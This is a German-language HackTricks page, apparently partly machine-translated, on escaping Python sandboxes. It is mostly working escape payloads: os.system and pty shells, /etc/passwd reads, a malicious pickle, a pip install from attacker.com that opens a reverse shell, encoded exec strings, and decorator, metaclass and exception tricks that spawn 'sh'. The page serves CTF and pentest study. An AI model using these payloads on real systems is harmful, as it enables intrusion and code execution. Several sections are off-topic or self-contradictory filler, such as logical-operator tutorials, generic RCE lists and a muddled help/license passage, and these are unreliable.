# Umgehen von Python-Sandboxes

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Finden Sie die wichtigsten Sicherheitslücken, damit Sie sie schneller beheben können. Intruder verfolgt Ihre Angriffsfläche, führt proaktive Bedrohungsscans durch und findet Probleme in Ihrer gesamten Technologie-Stack, von APIs über Webanwendungen bis hin zu Cloud-Systemen. [**Probieren Sie es noch heute kostenlos aus**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

Dies sind einige Tricks, um Python-Sandbox-Schutzmaßnahmen zu umgehen und beliebige Befehle auszuführen.

## Befehlsausführungsbibliotheken

Das erste, was Sie wissen müssen, ist, ob Sie Code direkt mit einer bereits importierten Bibliothek ausführen können oder ob Sie eine dieser Bibliotheken importieren können:
```python
os.system("ls")
os.popen("ls").read()
commands.getstatusoutput("ls")
commands.getoutput("ls")
commands.getstatus("file/path")
subprocess.call("ls", shell=True)
subprocess.Popen("ls", shell=True)
pty.spawn("ls")
pty.spawn("/bin/bash")
platform.os.system("ls")
pdb.os.system("ls")

#Import functions to execute commands
importlib.import_module("os").system("ls")
importlib.__import__("os").system("ls")
imp.load_source("os","/usr/lib/python3.8/os.py").system("ls")
imp.os.system("ls")
imp.sys.modules["os"].system("ls")
sys.modules["os"].system("ls")
__import__("os").system("ls")
import os
from os import *

#Other interesting functions
open("/etc/passwd").read()
open('/var/www/html/input', 'w').write('123')

#In Python2.7
execfile('/usr/lib/python2.7/os.py')
system('ls')
```
Denken Sie daran, dass die Funktionen _**open**_ und _**read**_ nützlich sein können, um Dateien innerhalb des Python-Sandboxes zu lesen und Code zu schreiben, den Sie ausführen können, um die Sandbox zu umgehen.

{% hint style="danger" %}
Die Funktion **Python2 input()** ermöglicht das Ausführen von Python-Code, bevor das Programm abstürzt.
{% endhint %}

Python versucht, Bibliotheken zuerst aus dem aktuellen Verzeichnis zu laden (der folgende Befehl gibt aus, von wo aus Python Module lädt): `python3 -c 'import sys; print(sys.path)'`

![](<../../../.gitbook/assets/image (552).png>)

## Umgehen der Pickle-Sandbox mit den standardmäßig installierten Python-Paketen

### Standardpakete

Eine **Liste der vorinstallierten** Pakete finden Sie hier: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
Beachten Sie, dass Sie mit einem Pickle die Python-Umgebung dazu bringen können, beliebige Bibliotheken zu importieren, die im System installiert sind.\
Zum Beispiel importiert der folgende Pickle beim Laden die pip-Bibliothek, um sie zu verwenden:
```python
#Note that here we are importing the pip library so the pickle is created correctly
#however, the victim doesn't even need to have the library installed to execute it
#the library is going to be loaded automatically

import pickle, os, base64, pip
class P(object):
def __reduce__(self):
return (pip.main,(["list"],))

print(base64.b64encode(pickle.dumps(P(), protocol=0)))
```
Für weitere Informationen darüber, wie Pickle funktioniert, schauen Sie hier nach: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)

### Pip-Paket

Trick geteilt von **@isHaacK**

Wenn Sie Zugriff auf `pip` oder `pip.main()` haben, können Sie ein beliebiges Paket installieren und eine Reverse-Shell aufrufen, indem Sie Folgendes verwenden:
```bash
pip install http://attacker.com/Rerverse.tar.gz
pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
```
Sie können das Paket zum Erstellen der Reverse Shell hier herunterladen. Bitte beachten Sie, dass Sie es vor der Verwendung **entpacken, die `setup.py` ändern und Ihre IP für die Reverse Shell eintragen** müssen:

{% file src="../../../.gitbook/assets/reverse.tar.gz" %}

{% hint style="info" %}
Dieses Paket heißt `Reverse`. Es wurde jedoch speziell entwickelt, damit bei Beendigung der Reverse Shell die restliche Installation fehlschlägt. Dadurch bleibt **kein zusätzliches Python-Paket auf dem Server installiert**, wenn Sie gehen.
{% endhint %}

## Eval von Python-Code

{% hint style="warning" %}
Beachten Sie, dass `exec` mehrzeilige Zeichenketten und ";" erlaubt, `eval` jedoch nicht (prüfen Sie den Walrus-Operator).
{% endhint %}

Wenn bestimmte Zeichen verboten sind, können Sie die **hexadezimale/oktale/B64**-Darstellung verwenden, um die Einschränkung zu **umgehen**:
```python
exec("print('RCE'); __import__('os').system('ls')") #Using ";"
exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
eval("__import__('os').system('ls')") #Eval doesn't allow ";"
eval(compile('print("hello world"); print("heyy")', '<stdin>', 'exec')) #This way eval accept ";"
__import__('timeit').timeit("__import__('os').system('ls')",number=1)
#One liners that allow new lines and tabs
eval(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
exec(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
```

```python
#Octal
exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")
#Hex
exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29")
#Base64
exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
```
### Andere Bibliotheken, die das Ausführen von Python-Code ermöglichen

Es gibt verschiedene Bibliotheken, die es ermöglichen, Python-Code auszuführen und somit Python-Sandboxes zu umgehen. Hier sind einige Beispiele:

- **`exec` Funktion**: Die `exec` Funktion ermöglicht das Ausführen von Python-Code als String. Sie kann verwendet werden, um Code in einer Sandbox-Umgebung auszuführen.

- **`eval` Funktion**: Die `eval` Funktion ermöglicht das Ausführen von Python-Ausdrücken als String. Sie kann verwendet werden, um Code in einer Sandbox-Umgebung auszuwerten.

- **`ast` Modul**: Das `ast` Modul ermöglicht die Analyse und Manipulation von Python-Code auf abstrakter Ebene. Es kann verwendet werden, um den Code zu analysieren und bestimmte Teile davon auszuführen.

- **`compile` Funktion**: Die `compile` Funktion ermöglicht das Kompilieren von Python-Code in ein ausführbares Objekt. Dieses Objekt kann dann ausgeführt werden, um den Code in einer Sandbox-Umgebung auszuführen.

Es ist wichtig zu beachten, dass das Ausführen von Python-Code außerhalb einer Sandbox-Umgebung potenzielle Sicherheitsrisiken birgt. Es sollte daher mit Vorsicht und nur in kontrollierten Umgebungen durchgeführt werden.
```python
#Pandas
import pandas as pd
df = pd.read_csv("currency-rates.csv")
df.query('@__builtins__.__import__("os").system("ls")')
df.query("@pd.io.common.os.popen('ls').read()")
df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")

# The previous options work but others you might try give the error:
# Only named functions are supported
# Like:
df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
```
## Operatoren und kurze Tricks

### Logical Operators

#### Logical AND (`and`)

Der logische AND-Operator (`and`) gibt `True` zurück, wenn beide Operanden `True` sind, ansonsten gibt er `False` zurück.

Beispiel:

```python
a = True
b = False

if a and b:
    print("Beide Bedingungen sind erfüllt.")
else:
    print("Mindestens eine Bedingung ist nicht erfüllt.")
```

Ausgabe:

```
Mindestens eine Bedingung ist nicht erfüllt.
```

#### Logical OR (`or`)

Der logische OR-Operator (`or`) gibt `True` zurück, wenn mindestens einer der Operanden `True` ist, ansonsten gibt er `False` zurück.

Beispiel:

```python
a = True
b = False

if a or b:
    print("Mindestens eine Bedingung ist erfüllt.")
else:
    print("Keine der Bedingungen ist erfüllt.")
```

Ausgabe:

```
Mindestens eine Bedingung ist erfüllt.
```

#### Logical NOT (`not`)

Der logische NOT-Operator (`not`) gibt `True` zurück, wenn der Operand `False` ist, und `False` zurück, wenn der Operand `True` ist.

Beispiel:

```python
a = True

if not a:
    print("Die Bedingung ist nicht erfüllt.")
else:
    print("Die Bedingung ist erfüllt.")
```

Ausgabe:

```
Die Bedingung ist erfüllt.
```

### Short Tricks

#### Ternary Operator

Der Ternary Operator ermöglicht es, eine Bedingung in einer einzigen Zeile zu überprüfen und einen Wert basierend auf der Bedingung zurückzugeben.

Syntax:

```python
value_if_true if condition else value_if_false
```

Beispiel:

```python
a = 5
b = 10

max_value = a if a > b else b

print(max_value)
```

Ausgabe:

```
10
```

#### Chained Comparison

Die verkettete Vergleichsweise ermöglicht es, mehrere Vergleiche in einer einzigen Zeile durchzuführen.

Beispiel:

```python
a = 5

if 0 < a < 10:
    print("Die Zahl liegt zwischen 0 und 10.")
else:
    print("Die Zahl liegt außerhalb des Bereichs.")
```

Ausgabe:

```
Die Zahl liegt zwischen 0 und 10.
```
```python
# walrus operator allows generating variable inside a list
## everything will be executed in order
## From https://ur4ndom.dev/posts/2020-06-29-0ctf-quals-pyaucalc/
[a:=21,a*2]
[y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
```
## Umgehung von Schutzmaßnahmen durch Codierungen (UTF-7)

In [**diesem Bericht**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) wird UTF-7 verwendet, um beliebigen Python-Code in einer scheinbaren Sandbox zu laden und auszuführen:
```python
assert b"+AAo-".decode("utf_7") == "\n"

payload = """
# -*- coding: utf_7 -*-
def f(x):
return x
#+AAo-print(open("/flag.txt").read())
""".lstrip()
```
Es ist auch möglich, dies mit anderen Codierungen zu umgehen, z.B. `raw_unicode_escape` und `unicode_escape`.

## Python-Ausführung ohne Aufrufe

Wenn Sie sich in einem Python-Gefängnis befinden, das es Ihnen **nicht erlaubt, Aufrufe zu tätigen**, gibt es immer noch einige Möglichkeiten, **beliebige Funktionen, Code** und **Befehle** auszuführen.

### RCE mit [Dekoratoren](https://docs.python.org/3/glossary.html#term-decorator)
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
@exec
@input
class X:
pass

# The previous code is equivalent to:
class X:
pass
X = input(X)
X = exec(X)

# So just send your python code when prompted and it will be executed


# Another approach without calling input:
@eval
@'__import__("os").system("sh")'.format
class _:pass
```
### RCE Erstellung von Objekten und Überladung

Wenn Sie eine **Klasse deklarieren** und ein **Objekt dieser Klasse erstellen** können, können Sie verschiedene Methoden **schreiben/überschreiben**, die **ausgelöst werden können**, **ohne sie direkt aufrufen zu müssen**.

#### RCE mit benutzerdefinierten Klassen

Sie können einige **Klassenmethoden** ändern (_durch Überschreiben vorhandener Klassenmethoden oder Erstellen einer neuen Klasse_), um sie dazu zu bringen, beliebigen Code auszuführen, wenn sie **ausgelöst** werden, ohne sie direkt aufzurufen.
```python
# This class has 3 different ways to trigger RCE without directly calling any function
class RCE:
def __init__(self):
self += "print('Hello from __init__ + __iadd__')"
__iadd__ = exec #Triggered when object is created
def __del__(self):
self -= "print('Hello from __del__ + __isub__')"
__isub__ = exec #Triggered when object is created
__getitem__ = exec #Trigerred with obj[<argument>]
__add__ = exec #Triggered with obj + <argument>

# These lines abuse directly the previous class to get RCE
rce = RCE() #Later we will see how to create objects without calling the constructor
rce["print('Hello from __getitem__')"]
rce + "print('Hello from __add__')"
del rce

# These lines will get RCE when the program is over (exit)
sys.modules["pwnd"] = RCE()
exit()

# Other functions to overwrite
__sub__ (k - 'import os; os.system("sh")')
__mul__ (k * 'import os; os.system("sh")')
__floordiv__ (k // 'import os; os.system("sh")')
__truediv__ (k / 'import os; os.system("sh")')
__mod__ (k % 'import os; os.system("sh")')
__pow__ (k**'import os; os.system("sh")')
__lt__ (k < 'import os; os.system("sh")')
__le__ (k <= 'import os; os.system("sh")')
__eq__ (k == 'import os; os.system("sh")')
__ne__ (k != 'import os; os.system("sh")')
__ge__ (k >= 'import os; os.system("sh")')
__gt__ (k > 'import os; os.system("sh")')
__iadd__ (k += 'import os; os.system("sh")')
__isub__ (k -= 'import os; os.system("sh")')
__imul__ (k *= 'import os; os.system("sh")')
__ifloordiv__ (k //= 'import os; os.system("sh")')
__idiv__ (k /= 'import os; os.system("sh")')
__itruediv__ (k /= 'import os; os.system("sh")') (Note that this only works when from __future__ import division is in effect.)
__imod__ (k %= 'import os; os.system("sh")')
__ipow__ (k **= 'import os; os.system("sh")')
__ilshift__ (k<<= 'import os; os.system("sh")')
__irshift__ (k >>= 'import os; os.system("sh")')
__iand__ (k = 'import os; os.system("sh")')
__ior__ (k |= 'import os; os.system("sh")')
__ixor__ (k ^= 'import os; os.system("sh")')
```
#### Erstellen von Objekten mit [Metaklassen](https://docs.python.org/3/reference/datamodel.html#metaclasses)

Der entscheidende Punkt, den uns Metaklassen ermöglichen, ist es, **eine Instanz einer Klasse zu erstellen, ohne den Konstruktor direkt aufzurufen**, indem wir eine neue Klasse mit der Zielklasse als Metaklasse erstellen.
```python
# Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
# This will define the members of the "subclass"
class Metaclass(type):
__getitem__ = exec # So Sub[string] will execute exec(string)
# Note: Metaclass.__class__ == type

class Sub(metaclass=Metaclass): # That's how we make Sub.__class__ == Metaclass
pass # Nothing special to do

Sub['import os; os.system("sh")']

## You can also use the tricks from the previous section to get RCE with this object
```
#### Erstellen von Objekten mit Ausnahmen

Wenn eine **Ausnahme ausgelöst wird**, wird ein Objekt der **Ausnahme** erstellt, ohne dass Sie den Konstruktor direkt aufrufen müssen (ein Trick von [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)):
```python
class RCE(Exception):
def __init__(self):
self += 'import os; os.system("sh")'
__iadd__ = exec #Triggered when object is created
raise RCE #Generate RCE object


# RCE with __add__ overloading and try/except + raise generated object
class Klecko(Exception):
__add__ = exec

try:
raise Klecko
except Klecko as k:
k + 'import os; os.system("sh")' #RCE abusing __add__

## You can also use the tricks from the previous section to get RCE with this object
```
### Weitere RCE

In addition to the previously mentioned techniques for bypassing Python sandboxes, there are several other methods that can be used to achieve Remote Code Execution (RCE). These techniques are outlined below:

#### 1. Command Injection

Command injection involves injecting malicious commands into user input fields that are then executed by the application. This can be used to execute arbitrary commands on the underlying operating system.

#### 2. File Inclusion

File inclusion vulnerabilities can be exploited to include and execute arbitrary files on the server. By including a file that contains malicious code, an attacker can achieve RCE.

#### 3. Deserialization Attacks

Deserialization attacks involve exploiting vulnerabilities in the deserialization process of an application. By manipulating serialized objects, an attacker can execute arbitrary code.

#### 4. Server-Side Template Injection

Server-Side Template Injection (SSTI) occurs when user input is directly embedded into a server-side template. By injecting malicious code into the template, an attacker can achieve RCE.

#### 5. XML External Entity (XXE) Injection

XXE injection involves exploiting vulnerabilities in XML parsers that allow the inclusion of external entities. By including a malicious entity, an attacker can execute arbitrary code.

#### 6. Server-Side Request Forgery (SSRF)

SSRF vulnerabilities can be leveraged to make requests to internal resources on the server. By exploiting SSRF, an attacker can execute arbitrary code on the server.

#### 7. Remote File Inclusion (RFI)

Remote File Inclusion (RFI) vulnerabilities allow an attacker to include and execute remote files on the server. By including a file that contains malicious code, an attacker can achieve RCE.

#### 8. Code Injection

Code injection involves injecting malicious code into an application. By exploiting code injection vulnerabilities, an attacker can execute arbitrary code.

#### 9. Template Injection

Template injection occurs when user input is directly embedded into a template engine. By injecting malicious code into the template, an attacker can achieve RCE.

#### 10. Server-Side JavaScript Injection

Server-Side JavaScript Injection involves injecting malicious JavaScript code into server-side scripts. By exploiting this vulnerability, an attacker can execute arbitrary code on the server.

It is important to note that these techniques should only be used for ethical purposes, such as penetration testing and security research. Unauthorized use of these techniques is illegal and can result in severe consequences.
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
# If sys is imported, you can sys.excepthook and trigger it by triggering an error
class X:
def __init__(self, a, b, c):
self += "os.system('sh')"
__iadd__ = exec
sys.excepthook = X
1/0 #Trigger it

# From https://github.com/google/google-ctf/blob/master/2022/sandbox-treebox/healthcheck/solution.py
# The interpreter will try to import an apt-specific module to potentially
# report an error in ubuntu-provided modules.
# Therefore the __import__ functions are overwritten with our RCE
class X():
def __init__(self, a, b, c, d, e):
self += "print(open('flag').read())"
__iadd__ = eval
__builtins__.__import__ = X
{}[1337]
```
### Datei mit Hilfe von builtins help & license lesen

Um den Inhalt einer Datei zu lesen, können Sie die Funktionen `help()` und `license()` der `builtins`-Bibliothek verwenden.

#### Hilfe-Funktion (`help()`)

Die `help()`-Funktion gibt Informationen zu einem bestimmten Objekt oder einer Funktion aus. Sie können diese Funktion verwenden, um die Dokumentation einer Datei anzuzeigen.

```python
help(open)
```

#### Lizenz-Funktion (`license()`)

Die `license()`-Funktion gibt die Lizenzinformationen der Python-Installation aus. Sie können diese Funktion verwenden, um die Lizenzinformationen einer Datei anzuzeigen.

```python
license()
```

Bitte beachten Sie, dass diese Funktionen nur Informationen über die Datei anzeigen und nicht den tatsächlichen Inhalt der Datei zurückgeben. Um den Inhalt einer Datei zu lesen, müssen Sie die entsprechenden Dateioperationen verwenden, wie z.B. `open()`.

```python
with open('datei.txt', 'r') as file:
    content = file.read()
    print(content)
```

Stellen Sie sicher, dass Sie den richtigen Dateipfad angeben, um auf die gewünschte Datei zuzugreifen.
```python
__builtins__.__dict__["license"]._Printer__filenames=["flag"]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__["license"]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
pass
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Finden Sie die wichtigsten Sicherheitslücken, damit Sie sie schneller beheben können. Intruder verfolgt Ihre Angriffsfläche, führt proaktive Bedrohungsscans durch und findet Probleme in Ihrer gesamten Technologie-Stack, von APIs über Webanwendungen bis hin zu Cloud-Systemen. [**Probieren Sie es noch heute kostenlos aus**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Eingebaute Funktionen

* [**Eingebaute Funktionen von Python2**](https://docs.python.org/2/library/functions.html)
* [**Eingebaute Funktionen von Python3**](https://docs.python.org/3/library/functions.html)

Wenn Sie auf das **`__builtins__`**-Objekt zugreifen können, können Sie Bibliotheken importieren (beachten Sie, dass Sie hier auch eine andere Zeichenkettenrepräsentation verwenden könnten, die im letzten Abschnitt gezeigt wird):
```python
__builtins__.__import__("os").system("ls")
__builtins__.__dict__['__import__']("os").system("ls")
```
### Keine Builtins

Wenn du kein `__builtins__` hast, kannst du nichts importieren oder sogar Dateien lesen oder schreiben, da **alle globalen Funktionen** (wie `open`, `import`, `print`...) **nicht geladen** werden.\
Allerdings **importiert Python standardmäßig viele Module in den Speicher**. Diese Module mögen harmlos erscheinen, aber einige von ihnen importieren auch gefährliche Funktionalitäten, auf die zugegriffen werden kann, um sogar **beliebigen Code auszuführen**.

In den folgenden Beispielen kannst du sehen, wie man einige dieser "**harmlosen**" geladenen Module **missbrauchen** kann, um auf **gefährliche Funktionalitäten** darin zuzugreifen.

**Python2**
```python
#Try to reload __builtins__
reload(__builtins__)
import __builtin__

# Read recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
# Write recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')

# Execute recovering __import__ (class 59s is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
# Execute (another method)
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__("func_globals")['linecache'].__dict__['os'].__dict__['system']('ls')
# Execute recovering eval symbol (class 59 is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]["eval"]("__import__('os').system('ls')")

# Or you could obtain the builtins from a defined function
get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
```
#### Python3

Python3 is a powerful programming language that is widely used for various purposes, including web development, data analysis, and automation. However, there are situations where Python code needs to be executed in a restricted environment, such as a sandbox, to prevent malicious activities.

In this guide, we will explore different techniques to bypass Python sandboxes and execute arbitrary code. These techniques can be useful for penetration testers and security researchers to assess the effectiveness of sandboxing mechanisms and identify potential vulnerabilities.

**Table of Contents**

- [Introduction](#introduction)
- [Bypassing Python Sandboxes](#bypassing-python-sandboxes)
  - [1. Code Injection](#1-code-injection)
  - [2. Dynamic Code Execution](#2-dynamic-code-execution)
  - [3. Exploiting Sandbox Limitations](#3-exploiting-sandbox-limitations)
  - [4. Breaking Out of the Sandbox](#4-breaking-out-of-the-sandbox)
- [Conclusion](#conclusion)

## Introduction

Python sandboxes are designed to provide a secure environment for executing untrusted code. They restrict the capabilities of the code by limiting access to certain resources and functionalities, such as file system operations, network connections, and system calls.

However, sandboxes are not foolproof, and there are often ways to bypass their restrictions. By understanding the underlying mechanisms of the sandbox and identifying its weaknesses, it is possible to execute arbitrary code and potentially escape the sandbox altogether.

## Bypassing Python Sandboxes

### 1. Code Injection

Code injection involves injecting malicious code into a Python script or application to bypass the sandbox's restrictions. This can be done by exploiting vulnerabilities in the application or by manipulating the input data to execute arbitrary code.

Some common techniques for code injection include:

- **Command Injection**: Injecting malicious commands into system calls or subprocess calls to execute arbitrary commands on the underlying operating system.
- **SQL Injection**: Injecting malicious SQL queries into database queries to manipulate the database or retrieve sensitive information.
- **Remote Code Execution**: Exploiting vulnerabilities in the application to execute arbitrary code remotely.

### 2. Dynamic Code Execution

Dynamic code execution involves executing code at runtime, bypassing the static analysis performed by the sandbox. This can be achieved by using the `eval()` or `exec()` functions, which allow the execution of arbitrary code stored in strings.

However, it is important to note that dynamic code execution can be dangerous if not properly sanitized. It can lead to code injection vulnerabilities and potential security risks.

### 3. Exploiting Sandbox Limitations

Sandboxing mechanisms often have limitations or blind spots that can be exploited to bypass their restrictions. These limitations can include:

- **Time-based Restrictions**: Exploiting time-based restrictions to execute code that exceeds the allowed execution time.
- **Resource-based Restrictions**: Exploiting resource-based restrictions to exhaust system resources, such as memory or CPU, and cause the sandbox to crash or become unresponsive.
- **Input Validation Bypass**: Bypassing input validation mechanisms to execute code that is not properly sanitized or validated by the sandbox.

### 4. Breaking Out of the Sandbox

In some cases, it may be possible to break out of the sandbox altogether and execute arbitrary code with full privileges. This can be achieved by exploiting vulnerabilities in the sandbox implementation or by leveraging other techniques, such as:

- **Kernel Exploits**: Exploiting vulnerabilities in the underlying operating system kernel to gain elevated privileges.
- **Container Escapes**: Breaking out of containerized environments, such as Docker or Kubernetes, to execute code on the host system.
- **Virtual Machine Escapes**: Breaking out of virtual machine environments, such as VMware or VirtualBox, to execute code on the host system.

## Conclusion

Bypassing Python sandboxes requires a deep understanding of the underlying mechanisms and vulnerabilities of the sandbox implementation. By exploiting these weaknesses, it is possible to execute arbitrary code and potentially escape the sandbox altogether.

However, it is important to note that bypassing sandboxes for malicious purposes is illegal and unethical. The techniques discussed in this guide should only be used for legitimate purposes, such as penetration testing and security research, with proper authorization and consent.
```python
# Obtain builtins from a globally defined function
# https://docs.python.org/3/library/functions.html
help.__call__.__builtins__ # or __globals__
license.__call__.__builtins__ # or __globals__
credits.__call__.__builtins__ # or __globals__
print.__self__
dir.__self__
globals.__self__
len.__self__
__build_class__.__self__

# Obtain the builtins from a defined function
get_flag.__globals__['__builtins__']

# Get builtins from loaded classes
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
```
[**Unten finden Sie eine größere Funktion**](./#rekursive-suche-von-builtins-globals), um **Dutzende/Hunderte** von **Stellen** zu finden, an denen Sie die **builtins** finden können.

#### Python2 und Python3
```python
# Recover __builtins__ and make everything easier
__builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
__builtins__["__import__"]('os').system('ls')
```
### Eingebaute Payloads

In einigen Fällen können Sie Python-Sandboxes umgehen, indem Sie spezielle Funktionen aus der `builtins`-Bibliothek verwenden. Diese Funktionen ermöglichen es Ihnen, auf bestimmte Ressourcen oder Funktionen zuzugreifen, die normalerweise in einer Sandbox blockiert sind.

Hier sind einige Beispiele für eingebaute Payloads:

- `__import__('os').system('Befehl')`: Führt den angegebenen Befehl im Betriebssystem aus.
- `__import__('subprocess').call('Befehl')`: Ruft den angegebenen Befehl im Betriebssystem auf.
- `__import__('os').popen('Befehl').read()`: Führt den angegebenen Befehl im Betriebssystem aus und gibt die Ausgabe zurück.
- `__import__('os').chdir('Verzeichnis')`: Ändert das aktuelle Verzeichnis auf das angegebene Verzeichnis.
- `__import__('os').listdir('Verzeichnis')`: Gibt eine Liste der Dateien und Verzeichnisse im angegebenen Verzeichnis zurück.

Diese eingebauten Payloads können je nach Kontext und den verfügbaren Funktionen der Sandbox variieren. Es ist wichtig, die spezifischen Einschränkungen der Sandbox zu verstehen und die Payloads entsprechend anzupassen, um die gewünschten Aktionen auszuführen.
```python
# Possible payloads once you have found the builtins
__builtins__["open"]("/etc/passwd").read()
__builtins__["__import__"]("os").system("ls")
# There are lots of other payloads that can be abused to execute commands
# See them below
```
## Globals und Locals

Das Überprüfen der **`globals`** und **`locals`** ist eine gute Möglichkeit zu wissen, auf was Sie zugreifen können.
```python
>>> globals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
>>> locals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}

# Obtain globals from a defined function
get_flag.__globals__

# Obtain globals from an object of a class
class_obj.__init__.__globals__

# Obtaining globals directly from loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x) ]
[<class 'function'>]

# Obtaining globals from __init__ of loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x.__init__) ]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, 